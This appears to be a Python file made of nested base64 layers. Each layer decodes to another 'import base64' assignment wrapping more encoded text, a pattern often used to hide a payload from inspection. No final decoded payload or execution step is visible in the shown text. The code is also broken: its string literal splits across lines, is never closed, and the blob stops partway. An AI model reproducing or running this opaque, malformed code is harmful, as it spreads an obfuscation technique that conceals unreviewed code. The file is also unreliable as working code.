import base64
x=("import base64
x=("aW1wb3J0IGJhc2U2NAp4PSgiYVcxd2IzSjBJR0poYzJVMk5BcDRQU2dpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0RSUVUyZHBXVlpqZUdReVNYcFRha0pLVWpCd2IxbDZTbFpOYXpWQ1kwUlNVVlV5WkhCWFZscHFaVWRSZVZOWWNGUmhhMHBMVldwQ2QySXhiRFpUYkZwT1lYcFdRMWt3VWxOVlZsVjVXa2hDV0Zac2NIRmFWV1JTWlZaT1dXTkdVbWhoTUhCTVZsZHdRMlF5U1hoaVJGcFVZa1p3VDFsWWNGZFJNV3QzVld4T1ZsWnNWalZYYTJoRFYwWmFjMk5JUm1GV1YxSlRXbFphVDFkWFRrZFZiV2hvVFVoQ1RWWnNaSGRSTWxGNVUxaG9hVkpHY0ZWWmExcDNWREZzV1dOR1pGSk5WM1F6VmxkNFQxWnNXbk5XYWxaWVlUSm9SRll3V21Gak1rNUpVbTFHVjFZeFNsUlhiRnBoVkRGa1dGUnJaRlppVjJodlZGVm9RMVJXV25OYVNHUlNUV3hHTlZVeGFHOWhWa3BIWTBaV1dtRXhjRE5XUkVaelYxZE9SMXBHU2s1V00xRjZWbXhrTkZReFduTlhiazVYWVd4YVdWbFVTbTlTUmxsM1YyMUdhazFyTlVwVmJURkhWakZaZUZOc1VsaGlSbkJvVmtSR2ExZEdVbkphUmxwcFZqSm9kbFpHVm05Uk1WSlhWMjVPWVZOSFVsTlVWM2hIVGxaVmVHRkhPV2hXYTNCSVdUQmFWMWR0UlhoalJFNVhVa1ZhZWxZeFpFOVNNWEJIVTJzMVYwMHhSalpXYlhoclRrWlJlRmR1VGxoaWF6VllXVmQ0WVZkV2JGVlRiVGxUVW14c00xWXlNVWRoYXpGeVRsVndWbUpVUmtoV2FrWmFaVVpPYzFWc2FHbFNia0p2Vm10U1IyRXhaRWRWYmtwaFVteHdjRlpxU205a2JGcEhWbTA1VWsxV1NsaFdNalZQVjIxV2NsZHVTbFZXTTA0MFZGUkdVMk15UmtaUFZtUlRUVVpaTVZac1pEUlZNV1IwVTJ4V1UySkdTbUZVVmxwM1YwWnJlRmRyWkd0V2JrSklXVlZrYzFVeVNrbFJiVVpYWVRKUk1GbFVSa3BsVmtweVlVWlNhVkp1UW5oV1ZFSnZVVEZaZUdKSVRsWmhNSEJ6VlcxNGMwNVdiRFpVYlRsb1lrWndlVmt3YUhkWGJGcFlWV3RvVjJGcldtRmFWVnBQWXpGYWMxcEhhR2hOU0VKMlZtcEdZV0V4VlhoYVJXUldZbXR3YjFWcVRsTldSbXh5Vm01a1YxWnNjREJhUlZwclYyeGFjMWRzYUZkTmJtaHlWbTB4Um1Wc1JuVlViRnBwVmtWVmQxWnFSbUZaVjFKSVZtdG9VRlp0VWxSWmJGcExVMnhrYzFac1drOVdiSEF3VlcwMVMyRnNTbk5UYkd4WFlsaG9NMVpyV2xwa01YQkdUMVpTVjJKRmNEVldSM2hoWVRKR1YxZHVTbXBTYldoWVdXeG9VMk5zVW5KYVJWcHNWbXMxZVZkcldtOVhSa2w0VTJ4R1YySllVbGhWZWtaclVqSktTVlJzV21sU01VcGFWbGN3ZUU1R1duTldibEpyVWpOU1ZsUlhkSGRUUm10M1ZXdGtWMDFXYnpKVmJYUnZWakZhUm1ORmVGZE5SMUpJVldwR1lXTXhjRWRVYld4VVVsVnZNVlp0TVRCVk1VMTRWbGhvVkZkSGFHaFZNRnBoVjBac2MyRkZUbGRTYkd3elZtMTBNRll4V25OalJXaFlWMGhDU0ZsV1pFdFdNVXB4Vld4b2FFMVlRbGxXYkdONFV6RmtWMUp1VGxKaVIxSnZXVlJHZDJJeFduRlNiVVphVm0xU1NWWlhkR3RXVjBwSFkwaENWMkpIYUVSVk1WcGhZMVpPV1ZwRk9WZGlTRUkxVmtaYVYyRXhaRWhTYmtwUFZqQmFhRlpxVGxOaFJtdDVaVWRHYWxacmNERlhhMXBQVkd4YWNtTkVXbGRoYTI4d1dWUkdVMk14VGxsalJuQk9UVzFvV1ZkV1VrZFRNVTVIWWtoR1UySkZjSE5WYlhoM1YyeHNWbHBGWkZaTlZtdzFXVlZvWVZZeFdrWlRiR1JWVm14d2NsWnFSbXRrVms1eldrWmtVMVp1UW1GV2JHTjRUa1pOZUZkWWFHRlRSWEJZV1cweFUyTkdWbkZSYm1SVFRWWktlbFl5TVRCV01WbDNZMFZvVjAxdWFGUldNbmhoWXpKT1NGSnRSbGROTW1kNVYyeGtOR1F4U1hsU2EyUmhVbXMxV0ZZd1ZrcE5SbHAwWkVkMFQxSXdWalJXTVdodldWWktXRlZzYUZwaVdGSXpWbXBHYzJOc1duVmFSMnhPVmpOb1YxWldZekZoTWtWNVUydGthbEpGU2xaWmEyUnZZMnhhVlZGWWFHcGhla1pXVmxkNFlWUnRTbk5UYm14WFlrWktURlY2U2xOU01WcDFWbXhPYVZKdVFuWlhWbEpEWkcxV2MxZHVSbFJoYkVwWVZGWmtVMUl4VW5OWGJUbFdUV3R3V1ZsVmFFTldNa3BJWVVWU1ZXSllhR2hXTUZWNFUxWndSazVXWkdsV2Eyd3pWbTB3ZDAxV1RYaFZXR2hoVWxkNFUxbHNaRzlYUm14WVkzcEdWMUpzY0hsV01qRkhWMFpLVlZKc1pGcE5SMUYzVmtkNFMxSXhaSE5oUm1ScFVqQTBNRmRZY0VkWGJWWlhVMnhzYWxKcmNHOVphMmhEVjFaa1YxcEVRbXBOUkZaSVdXdFNZVlV5UlhoalNFNVhZbGhTTTFSV1dtRlhSMVpHVDFkb1UxWkZXWGRYVmxaaFl6RmtSMWRZY0doVFJuQlhWbXRXZDFNeGNGWlhiR1JxVFZoQ1NGWXlNWE5oUlRCM1UycGFWMDFYVVhkWlZFWldaVlphZFZSdFJsUlNXRUpaVjFaa01GTXlUa2RXYmtaU1ltMVNXRlJXV25OT1ZuQldZVWQwVjAxRVJsaFpibkJMVm0xS1IxTnJVbGRoYTFwTVZtcEtUMUl4Um5OWGJXaG9UVmhDTlZZeFVrZFpWbXhZVkZoc1ZXRXlhRzlWYkZKWFZrWldkR1ZJU214U2JIQXdXa1ZrZDJKR1NsVlNhMmhYWWtkb2RsWnFTa3RqTVU1elZteGtUbEl4UlhkWFZsWmhWakpOZVZKcldsVmlSbkJQVm0xMGQxZEdXblJOU0doVFRXdFdORll5TlZOV2JVcDBaVVpvV21KR1NrTlVWbHBoWTJ4YVdXRkdUbGRpU0VJMlZqSjBZVll4VW5OWFdHUk9Wa1pLV0ZsVVNsSk5SbFkyVW0xMFYwMVdjREZWTWpFd1ZUSktTVkZzYkZkV00yaFlXa1JHVDFZeGNFZGhSVFZYVW10d1YxWkdXbUZrTWxaelYyeG9UMVpZVWxoVmFrSjNWakZaZVdONlZsZGlWVnA1Vkd4b1lWWnRTbGxoUjJoWFlXdGFlbFJ0ZUV0a1IwNUdUbFprVGsxdGFHRldiWEJMVFVaWmVHSkdaRlpYUjJoWldWUkdkMVZHV25GUmJVWmFWbXh3ZUZaSGVFOWlSbHAxVVd4a1YwMXFWbkpXTUZwS1pVWmtjbU5HYUdoTldFSjVWbXhTUzFKdFZraFVhMlJoVW0xb1dGUlVSa3RYVm1SeVZXdGtXbFpyYkRSV1J6VlBZVlpLY21OSVFscGlXRkpNVmpKNFlXUkhVa2RhUm5CWFRWVndObFpxU1RGU01WcElVbGh3Vm1KR1dsZFpiR2h2VkVaWmVXVklTbXROVjFJd1ZXMHhiMVl3TVVsUmFsWlhWa1Z3TmxSc1dtdFNNV1JaWTBkb1ZGSllRbGxXYlhSWFpERlJlR05HV21GU1ZHeFVXV3RrVTJWc1duUk5XRTVYVFZWc05sbFZXa2RXTWtwVlVtcE9WbFl6VGpSV2JYTjRWbXh3U0dOR1RsZGlTRUpZVmpGYVUxRnJNVmRYYTJSWVlteEtjMVZxUW1GWFZscDBaVVZrVDFKdFVscFpNRlpyVmpBeFZtTkljRnBOUm5CeVZteGtTMUl4WkhOUmJHUk9VakZLU1ZkVVNqUlVNbEpZVkd0a1dHSlhhRTlXTUZaTFUyeGFkR05GVGxwV01VWTBWVEkxVTFaWFJYbFZiRlphWVRKU1ZGWnJXbUZqTWtaR1ZHeFdUbFp1UWpaV2JHUXdZVEZaZDAxV1pGTmhiRXBYV1d4U1YxVkdiRmRXV0dSc1ZteGFNVlZYZUdGaFZrcDFVV3N4VjJKR1NraFhWbVJQVmpGU2RWUnNWbWxTYTNCUVZtMHhOR1F4V1hoWGJHUmhVa1ZLVDFWcVFsZE5NVkpYVjIwNVYySlZXbmxWTWpGSFYyeGFSbGR0YUZkV1ZuQjZXVEo0YTJSR1NuUmtSbVJvVFZoQk1sWXhVa05aVjBWNFZsaHNWMkpyTlZsWmJURTBWMVphZEdWSVpGZE5XRUpYVjJ0Vk5WWXdNVmhWYWtaV1lsaG9kbGxXV2twbFYwWkpXa1prVjAweWFGVldWbEpDVFZaSmVHTkZiRlZpU0VKUFZGY3hiMWRHV2tkWGJGcE9WbXMxU0Zac2FITlVNVnBZVld4a1dtSkdXak5XTW5oaFYwZFdTVlJzWkdsV1dFSkpWbFJLTkdJeGJGZFRiR1JxVWpCYWFGWnNXbmRYUm10NVRWVTVVMkY2YkZoWGExVXhWVEpLU0dSRVRsZGhhMXBVVlZSR2MxWXhXbGxoUm1ScFlYcFdXbGRXVWt0aU1rMTRWbTVTYTFOSFVsbFZiWGgzWlZaYWRHUkVRbGRTYTNCNlZUSTFkMVl3TVhWaFJrSlhZV3R3VEZWcVJtdGtWMHBIVjJzMWFXRjZRalJXTVZwWFZtMVdSMWR1VWxWaE1sSlhXV3RrYjFkR1VsVlJhM1JWVm0xU1dGWlhkR3RXVlRGeVRWUlNWazF1YUhwWFZscExZMnMxV1ZGc1pHaE5XRUp2Vm0weE5GbFhVa2hXYTJSWVlYcFdXRmxVUmxwTlJsbDVaRWM1VTAxV1dqQlZNalZMVkRGYWMxTnNaRnBpUjJoVVdWVmFXbVZHWkhSa1IzQnBVbTVCZUZZeWRHRlpWMFpJVm01S1dHRXlhRmxXYWs1RFZVWndSVkp0ZEZOTlYxSjVWakl4YzFVeFNuSmpSMmhZWWtkUmQxcEVSbUZTTVdSWldrWm9hVkl4U25oWFYzUmhXVlV4UjFadVVtcGxhMXB2Vm0weFUxTldiRlphUnpsWFRXdHdTVlpXYUd0V01rWnlWMnQwWVZKRlJYaFdNVnBUWXpGa2RHSkdUbWxUUlVwWFZtcEdhbVF3TVZkU1dHeFZWMGRvY0ZWdE1UUmpWbFp6V2taT1ZVMVdXakJhVlZZd1YwWktjMkpFVmxWV2JFcEVWbXBCZUdOdFRrWmFSbkJPVW01Q2IxWnRjRWRaVlRWelVteHNhRkp0VW05WlZFWjNWRlphV0UxSWFGTmlWbG93VlcxMGEyRnNTWHBoUnpsVlZrVktURlV5ZUdGa1IwNUdWR3hrYUdWcldsbFdNblJYWWpGWmVWSllhR3BUUlZwWFdWZDBkMlJzV1hkWGJFNVhWbXR3ZVZwRldtRldNa3BKVVd4c1YySkhVWGRVVldSSFkyc3hWMWRzYUdsaWEwcG9WMVprZWsxWFRuTmlSbVJZWVROU1dGUldWVEZsYkZwSVpVZDBhRkl3VmpaVlYzaFhWakZrU1ZGcmFGZGhhMXBvVm1wR1MyUldUblJTYkU1T1ltMW9NMVpzWkRSVk1WbDRXa1ZrV0dKcmNHaFZhMVpMVmxaU1YxZHVaRmhXYkZwNldWVmtNRlpWTVZoVmEyeFhWak5vY2xacVNrdFdWa3B6Vld4d1RtSnRhRmhYYkZwclZqRktjMXBJVW10U1ZGWllWakJXUjAweFduSmFSRkphVm14V05GWXhhRzlYUjBwSFYyeG9XbFpGV2t4V01GcFRWMFUxVmxSc1VsTmlhMHBIVmxjd2VFMUdXa2RUYms1cVUwZDRZVmxVU2xOTk1WcFZVVmhvVTAxck5VaFphMXByVmpKV2MxZFljRmhYU0VKSVZtcEdTbVZHWkhWVWJHUnBVbXR3ZDFkV2FIZFdNVnBIV2tab2ExSXpRbEJXYkZKRFRrWnNjbUZGZEZkTmEzQkhWR3hhYTFkdFJYaGpTSEJWWWtad2FGWXdaRk5TVmtaeldrZHNVMkpyU2tsV2JGSkxUVWRKZUZwSVVsUmlSM2h2VlcxMFMxZEdiSE5oUnpsWFVtMTBOVnBWVlRWaE1VcHlZMGhzVldKR2NGQldSM040WkVkR1JrMVdaR2xYUjJodlYxWmtlbVZHWkVkVmJHeHBVbXMxYjFSWGVFdFhiR1JYV2tSU2EwMVhVa2hXTVdocldWWktjazVXYUZkaVdHaE1WbXBHYTJOc1pISlBWbWhwVW01QmQxZHNWbUZpTVZsM1RWaEdVbFpGV2xoV2ExWmhZVVpyZVdWSGRHcE5helZJV1RCVk1WVXlTa2RYVkVKWFlsaFNjbFJyWkVabFJrNTFVMnM1VjFac2NGWlhWM1JyVlRGYVIySklTbWhTVlRWelZXMHhVMlZzV25STlZXUlhVbFJHZWxVeWRHOVdNVm8yVm14b1YyRnJjRXhWYWtaUFpGWkdjMk5IYUU1aVYyaEdWako0VjFsWFJYaFhXR2hoVTBVMWFGVnRlRXRVTVZweFVtdDBWRlpzY0hoVk1uQlRWMnhhYzJKRVVsZE5ibEpvVm10a1MxZEhSa2RYYkdSb1lYcFdWVmRXVm1GWGJWWllWbXRvVTJKRk5VOVdNRlpMVTJ4a2NsWnRkR2xOVm13MFZqSjBZVmRIUm5OalJteFhZVEZhVEZwSGVHRldWa3AwVW14T1RsWXhTalpYVmxaaFZqRlplRk5zWkdwU2VteFlXV3hTUmsxR1pGZGFSbVJxVFZad1dsbFZXbTloVmtwVlZtNXNWMkpVUlhkWFZsVjRVakZhZFZWdGNHeGhNWEIyVmxkd1EyUXhUa2RoTTJSV1lUTlNXRlJWVWtkWFZscFhZVWQwVjAxVmNFZFdNblJyV1ZaYWMyTkdVbHBOYWtaSVZXcEdZV1JIUmtoaVJrNXBZVEJ3VjFadGNFZFpWMFY1Vm01S1RsWnRhRlJaVkVwVFYxWnNkR1JIUmxaTlYzaDZWbTB4UjJGck1WZGpSRUpoVmxaWmQxWnJXbUZrUjFaSllrWmthVlpHV25sWFZsWnJVekZLZEZSclpHaFNiSEJQV1cweGIxVldXbkZUV0doVFRXczFNRlpIZEhOV1IwcEhZMFU1V21KVVJuWlZNRnByWTJ4V2NscEdVazVpUlhCSVZrZDRZV0V4V25SVGEyaFdZa2RvV0ZsVVJuZGhSbFp6VjIxR2FsWnJOVEZYYTFwTFZHMUdObEpVUWxkV1JXOTNXVlJHVm1WV1RuSmhSMmhUVFcxb1dGZFhkR3RpTVVwSFYyeFdVMkpGTlZoWmExcDNUVlpaZVdONlJtaFdhMncwVlRKd1lWWXlSbkppUkU1VllrWndhRll3V2s5ak1YQkhWVzFzVTAxdGFHOVdhMXBYV1ZkUmVWWnVUbWxTYkhCWldWaHdjMVpHYkhKV1ZFWk9WbXhXTlZwVlpFZFdNREZXWTBad1ZsWjZWbnBXYWtaS1pXeFdkR0ZHWkZObGExcFpWbGR3UjFReVRYbFRhMmhUWWtVMWNGVnNhRU5WVmxweldraGtWVTFyYkRSVk1qVlBWMGRLU0ZWc2JGcGlSMmhVV1dwR1UxWXhXbFZTYlhocFVteFpNRmRXVm1wT1ZtUkhVMjVPYWxKWFVsZFVWelZ2Wld4YWNWTnJXbXhTYlZKNFZrZDRhMVJzU25WUldIQlhWak5vYUZaRVNrNWxSbFoxVkd4V2FWSlVWblpXUmxwcVRsVTFSMWRZYUdGU1JVcHZWRlpXYzA1R1pISldiWFJYVWpCd1NWWlhOVU5XYlVWNFkwVjRWMDFHY0ZSV01GVXhWMFU1V0dSSGJGTmlhMHBJVm14YVlXSXlTWGhYYTJSVVltczFWVmx0TVc5WFJteHpZVVUxVGxac2NIaFZWbWhyWWtaWmQxZHJjRnBOUm5CeVZtcEJkMlF4VG5KVmJHUlRZa2hDZVZaclkzaFdNVTVIVTJ4c2FsSXdXbFJVVnpGdlZsWmtWMkZJWkZkTmJGcElWako0YjJGc1NsWk9XRVpWVmxaS1dGWXdXbUZYUlRWV1QxZG9VMkY2VmtwV2JHUTBXVlpaZVZKdVNsUmhhelZYV1ZkMFlXVldjRVZUYTJSVFlYcHNXRmxWWkc5aVIwVjRZMGRHVjAxV2NGaFhWbVJLWlVad1NWVnNUbGhTTTJoWVYxWm9kMk15UmtkWGJrWlZZbFJzV1ZWdE1UQk9WbkJXV2tSQ2FFMVZiRFJXTW5SdlZqRkplbFJZYUZkV1JWcE1XWHBLUzA1c1RuTmFSMmhvVFZoQ1ZsWnNXbE5UTVU1MFZtdGtXR0pIZUhCVmJYaGhZakZTV0UxWE9WZGlSbkI0VlZjeE1GUXhTbk5YYTJoWFlsUldTRlpyWkV0U2F6VllVbXhrYVZkSGFEWldSbEpIV1ZkTmVWSnJhRkJXTW1oWVZGVm9RMU5zV25OWmVrWnJUVlpzTkZZeWNHRldNa3BZWVVab1dtRXlVbFJWYWtaM1VsWkdWVkpzYUZkaWEwcEpWbXBLTkdFeVJsZFhia3BxVWtaYVdGbHJXa3RVUmxKeVYydDBhMUpzV2xwWlZWcFRZVmRLUm1OR1JsZGlWRVV3VlhwR2ExSXhaSFZVYkZwcFVqRktWVlpYTVRSak1EVlhZVE5rVjJGclNsaFdiRkpIVmpGU2MxZHRPVmROVlc4eVZtMTRiMVl4V2paU2EzaFhUVWRTV0ZVeFdrZGpNazVJWVVVMVYySnJTakpXYlhSaFlUQTFSMXBJVWxkaVJuQlBWbTB4TkZac2JISlhhM1JWVFZad2VGWkhlRXRpUjBwSFkwVm9WMDF1YUhKV2FrRjRWakpPUjJGR2FHaE5WbkEyVm14amVGTXhUa2hXYTJob1VtMVNiMWxZY0ZkVlZscElaRWRHVmsxck5YcFhhMmhYVmxkS1dWRnJPVmRpVkZaRVZHMTRXbVZYVWtoa1JUbFRZa2QzZWxaR1dsZFdNVmw0V2tWb1ZtSkhhRmRaVkVaaFlVWndTR1ZJVGs5aVJYQjVWREZrZDFSc1dsVldXR2hYWVRKT05GcEVSbFpsVmtwWlkwWkthVkl6YUZsV2JYQlBVVEZTUjFWdVNsaGhNMUpVVkZkMFYwNXNaSEphUldSV1RWWndTVnBWV2tkV01rcFZVbGhrV0Zac1ZqUldha1pyVjFkS1JrNVdaRmROVlhBeVZtMHdlRTVIVVhkTlZXUnFVbXh3YjFWdE1WTlhWbFowWlVoT1QySkdXbGxhVlZaUFZqSkdObEpxUmxwV1ZrcE1WMVphWVdNeVRrZGhSbkJPWVd0YVNWWlVRbXRTTVVsNFZXNUtUMVpVVm5CV2FrcHZWREZhZEUxVVVtaE5iRVkwVmtab2ExUXhXbGRqUlRsWFlsUkdWRmt4V2xkak1XUjFXa2RvVTJKR2IzZFdSbHBoVkRKR2NrMVdaR3BUUjJoWFZtNXdWMk5zV2tobFJYUnFUV3MxUmxWWGVIZFViRXB6WTBaR1YySllVbkpWZWtaTFpFWk9jbFpzWkdsV1ZuQlpWbTB4TUdReVNYaFhibEpyVWpCYVlWWnRNVk5UVmxaMFpFaE9WMUl3Y0VwVlZ6QTFWbFphZEdGRlVsVmlXR2hvV1RGYVIyUkhVa2RXYld4WFlraEJNbFp0Y0VwTlZrMTVVbTVPVkZkSGVHOVZiVEZ2Vm14YWNsWnRSbFZTYkhCWVZqSXhSMVl3TVZkWGJteGhVbGRTTTFaSGVHRldNazVGVjJ4b1YwMHdTbEZYVmxKTFVqRlplRlJ1VG1GU2JFcHdWV3hTVjFkV1pGZGFSRUpyVFZad1NGWnRjR0ZWTWtwSVZXeG9WMkpZVW1oYVZscHJZMnh3U1ZSdGFGZGhNbmN5VmpGU1QyTXhXWGxTV0d4VlYwZG9XRlZyVm5kVVJsVjNWMnQwV0ZZd05VbFpWVnBQVlRGYVdWRnNjRmROVjFFd1dXcEdSbVZHWkhKYVIyeFRZa2hDV2xkWGVHOVZNVnBIVld4a1YySnRVazlXYlhoelRsWndWbGR0ZEZkTlJFWjVWakZTUzFZeVNsbFJiR2hYWVd0d1IxcFdXbGRYVm5CSFdrWk9VMWRGU2s1V01WSkxaVzFXUjFkdVRtRlRSa3B5Vlcxek1WUXhVbGRXYm1SYVZteHdlbGRyVWxOaFZURldWbXBPVldKSGFGQldha1pyVTBkR1IyRkdjR2hOVm05NlYxUktORlV4V1hoaVJGcFhZWHBXVDFacVRtOU9WbVJYVm0xR1ZVMXJXa2hWTWpWTFlXeEtXRlZzWkZWV00wSllWa1ZhWVdSSFRYcGhSazVPVmpGS05WZHNWbUZXTWtaWFdrVm9hRkpzU2xsWmExcDNZMnhXY1ZGVVJtcE5WbkF4VmxjeE1GVXdNWFZoUmxaWFVteEtURmxxU2tkU01XUjFWR3hvYVZkRlNsQldiVEV3VmpBMVIxZHNhR3hTZW14WVZXcENkMlZXVW5OWGJHUllZbFZ3V2xaR2FHOVhSbHB6WTBod1YySkdjRkJaZWtaVFl6SkdSMVJ0YkZoU01sRjZWbTEwWVZsV1duSk9WbWhUVjBkb1ZWbHRkSGRqVmxaeVZtMUdXRkpzY0hoV1IzTTFWREZLZEdWR2FGZE5ha1pJVm10YVNtVkdUbFZUYkZwcFYwZG9lVlpyWTNoU01rMTRXa2hHV0dKSFVsaFZiR00wWkRGYWMxVnJkRlZOYXpFMFZtMDFWMVl5U2tkalNFSldZbGhvTTFwRVJtRmtSMUpJWkVVNVUwMUhkekJXYWtreFZUSkdjMU5zV21wU1ZHeFlXVmQwWVdGR1dYZFhiWFJxWWtad2VsZHJXbXRXTURGSlVXMUdWMkpIVFhoVlZFWmhaRVpPYzFac1RsZFNWWEJYVm0weE5HUXlSa2RXV0dSWFZrVmFXRmxyV2t0TlJteFdWbFJHVjAxV2JEWlhWRTVyVmpKS1ZWRnFUbFZXYkhCNlZtcEtTMUl4Y0VkVmJXeHBVbGhDTWxac1pEUmlNa2w0WWtaa2FsSnRhSEpWYkdoRFkyeFNWMWR1WkZoV2JYY3lWa2N3TlZack1YSmpSbWhXVFc1U2NsWnFTa3RYVjBaSVlVWmtUbEp1UWsxV2JUQjRVekZLVjFkdVRtRlNWRlpZV1ZST1ExVnNXWGhWYTNSc1lsWmFTRmRyVm10WFIwcHpWMnhrV21FeVVsUlpNRnBYWTFaU2RFOVdaRTVXTVVwWlZqSjBVMUV4V2taTldFcFlZVEpvV0ZSWGNGZFhSbXhZWlVWMFYyRjZWbHBWTW5oM1lVVXhWMVpxVWxoaVJscG9WbTB4VjFkR1VuRlhiR1JwVmpKb2RsZHNaREJaVm14WFYyeGtZVkpHU25GVVZscDNUVVpWZVdWR1pGZE5hM0F4VlZkNGExbFdXWHBWYWs1WFRVWndZVnBFUm5kU01WSnpWRzFvYkdKWWFGcFdiRkpMWldzeFdGSnNaRmhpUmxwWFdWZDRkMWRHYkhKYVJ6bE9UVlphVmxVeWN6RmhNREZGVm14b1dHRXhjRkJaVm1SR1pXeEdjMWRzYUZkTk1tZ3lWbXhTUjJFeFdYaFhibFpXWWxoU1ZWVnFSa3RWUm1SWVpFZDBWazFYVWxoWlZFNXJWakZhUjFkc2FGWmlSa3BJV2xkNFdtVlZOVmxVYkdSWFZrVmFXbGRXVmxkVk1WbDRWMnBhVTJFeVVtaFZhMVozVlVaV2NWSnNUbXBOYXpWSVdWVmFVMVV4V2xoUFNHeFhZbFJGZDFsVVFURlNNVnBaWVVaU1dGSXlhRnBYVnpFMFV6RldWMWR1VW10VFIxSnhWVzE0WVdWc1dYbGxTR1JwVWpCd1NWWlhOWE5XTWtwWllVaEtWMDF1YUdoWmVrcFBVbFpHYzFkdGJGaFNNbWgyVm0xMFUxSXhiRmhVV0d4VllUSlNjRlZ0TlVOaU1WSllaVVYwVjFKc2NFaFdiVEZIWVdzeGNrNVljRmhoTW1oWVZqQmtTMWRYUmtsUmJGcHBVbXR3V0ZkclVrZGhNVmw0VjI1U2ExSXpRazlXYlRFelRVWmFjbHBFUWxwV2JIQkpWV3hvYTFReFduUmhSbWhhWWtkb2RsUlVSbHBrTVdSMFVteGtWMkV6UVhoV01uUnJaREZTYzFkc2JGSmhiSEJZV1ZkMGRrMUdXbFZUYTJSWFRWVTFlbFl5TVhkVk1rcFhVMnhzVjJKVVZqTlZha0YzWlVkS1JWZHNUbWhsYlhoNFZrWmFZV1F5Vm5OYVNFcFlZbGhTYjFWcVJtRk5SbkJXVjIxMFYwMVdiekpWYkdocldWWktSbGR1U2xaaGExcG9WakZrUjFJeGNFZGFSazVYWW10S1YxWnRlR3RrTVVWNFYxaGtUbE5IYUc5VVZFcFRWMVpzVlZOc1RsaFNiRXBaV2tWYWExUXhTblJsUm5CYVRVWmFjbFpxUVhoamJVNUdZVVp3VGxKdVFsRldNVnBoVXpGS2RGUnJaRlppUm5Cd1ZqQmtiMlZXWkZsalJXUmFWakZLU1ZWdGRHdFpWa3AwVld4b1dtRXhjR0ZVVlZwaFpFZFdSMVJzVGs1V2JYY3dWbXhhYjJNeFZYbFRia3BxVW10S1dGbHJXbmROTVZwRlVtMUdhMUl4V2tsVmJYaGhWR3hhZFZGcVZsZGlWRUkwVldwR1lWWnJNVmRoUjNoVFlsaG9iMVpYZUd0aU1WSkhWMnRvYkZJd1duRlVWbFV4Wld4cmQxZHVaRlZpUlhBeFZWWm9kMWRHV25OVGEwNWhWbFp3VEZZd1drOWpiVXBJWWtaT2FWTkZTak5XYlhCRFdWWk5lRlZzWkZoaWF6VlhXVlJLVTFsV1duUmxTR1JZVW14V05WUnNWVFZXYXpGeVkwVm9XazFIVFRGV01uaGhVbTFHTmxKc1ZsZFNWbkJ2VjFSS05GWXlUbk5qUldSVllYcFdiMXBYZEZkT2JGcHlWV3RrV2xadGVGbFZiWFJyVmtkS2NrNVdiRnBoTVhCTVZtcEdjMk5zWkhSU2JHUk9WMFZLUjFaWE1IaE5SbVJIVTFob1ZHRXlhRmxaVkVaM1RURmFjVk5yV214U2JWSldWVzE0YTJGV1NYZE5WRkpYVmpOQ1NGbFVSa3BsUjA1R1YyMW9VMDF0YUZWWFYzaHZZakpHUjFkdVVtdFNiVkpoVm1wR1lXVnNXbGhPVlRsWVVqQndTRmt3YUU5WGJVcEhWbGhvVm1GclduSlpNbmhyWTJzNVdHRkdUazVXYmtFeVZtMHhOR0l5VFhoWFdHeFRWMGQ0VmxsWGN6RldiRnAwVFZaT1ZGSnNjSGhWYlRFd1lXMUtTRlZ1Y0ZwV1YxSjJWa2Q0YTFKc1RuTmpSbVJPVmpGR00xWXhXbUZqTVdSSFZtNU9ZVkpzY0hCVmJUVkRWMVprV0UxSWFGWk5Wa1kwVmxkNFlWWnRSWGxWYkZKVlZtMW9SRlZxUmxwbFYxSkZVV3hrVjAxSVFraFhWM1JUVmpGa2MxZHNaRmhpUmtwWVdWZDBkMVJHV1hoWGJHUnJVbXR3ZWxadE1YTlZNa3B5VTJ4S1YwMVhhRE5WYWtaU1pWWlNkVlJ0Y0ZOV01VcFpWMWQwYTFVeFVYaGlTRXBYWW0xU1dGVnRlSGROUm5CV1YyczVWbUY2UmxkVVZsSlhWbTFLV1dGSVNsZGlSMUpNV1hwR2EyUkZPVmRXYkdSVFYwVktWbFl4YUhkU01WbDVWRmhvVjJKcmNHaFZiWE14WTBaV2RHVklaRmhXYlZKWVZtMHdOVlpWTVZkalJtUlZWbXh3YUZsWGVFdFhSbFp6VjJ4a2FWSnVRazFXVjNSaFdWZE5lRnBJVW10U2JFcFlXVlJHZG1WR1pGaGtSM1JUVFZac05WVXlkR3RYUmxwR1UyeHNWMkV4V21oWlZWcGhVbFpLZEdSR1pFNWhlbFpJVm1wSmVFMUdWWGhYYTJSWVlrZDRXRlpxVG05WFJuQkZVbXhrVjAxWFVucFhhMXBoWVVVd2VGTnNRbGRXTTBKRFdsVlZNVkl4WkhOaFJUbFhWa2Q0V0ZaR1pEQmtNVTVIWVROa1lWSjZiRmhaYkZaM1UwWnJkMVZyT1ZkTlJFWXhXVlZhVTFZeVNsbGhTRXBoVW14d00xVnFSbXRqTVhCSVlrWlNVMVpZUWt0V2JUQjNaREpXUms1VlpGWlhSMmhZVmpCa05GWldiRlZUYkU1WVZtMTRNRlJXV2s5V01ERlhZMFJDWVZaV1dYZFphMlJMVWpGYWNWWnRSbGRXYkhCdlYxZDBZVmxYVFhoVWJsWm9VbXh3VDFsdE1XNWxiR1JZWkVkMFUwMUVWbnBXTWpWUFZqSktTR0ZIT1ZWV00wMTNWRlZhWVdOc1ZuSmtSbHBPVmxkM01GWnJZekZXTVZwMFVtcGFhVkp0YUZaV2JGcDNUVEZaZDFkdGRHcE5WM1EyV1ZWVk5WVXdNVmRqUkZwWFRXNVNhRmxxU2t0U01VNXhWMjFzVTJKWGFGZFdiWEJQVkRBMVIxVnVTbGhpYXpWeFdXdGtVMDFXV2tobFIzUm9WbXh3V2xWWE1VZFhSbHB6VjI1S1dtRnJXbWhaZWtaM1VtMUtSMU50YkdsVFJVcFlWbTB4TUZZeGJGZFhhMlJYWW1zMVdWbFVTbE5qVmxKWFYydDBiR0pHY0VsYVZWVTFZVVpKZUZkdWNGZE5ibWg2Vm1wS1JtVkhUa2RoUm5Cb1lURndObFp0Y0VkWlYxSlhWRzVLVDFadGFGUldNRlpMV1ZaWmVGZHRkRTVTYXpFMFYydGFhMkZXVGtaalIyaFdZbTVDZWxadGVGZGtSVEZWVld4a1RsWnVRWGRXUjNoclRVWmFXRkpxV2xOaE1YQlhXV3hvVTJOc1pGZFhhM1JYVFZkU2VsbFZXbXRoVm1SSVlVaHNWMVo2UlRCV1JFcFRWMFpPY2xwSFJsTldSbHAzVjFkNGEySXdOVmRYYmxKcVVsaFNVRlZxUmt0TlJscDBaVWQwVjJKVmNFbGFWV2hEVm0xS1ZWSnNVbHBOUm5CNldUSjRhMlJXY0VoaVJUVlhZbXRLWVZacldtRmlNa1Y1VW01S1RsZE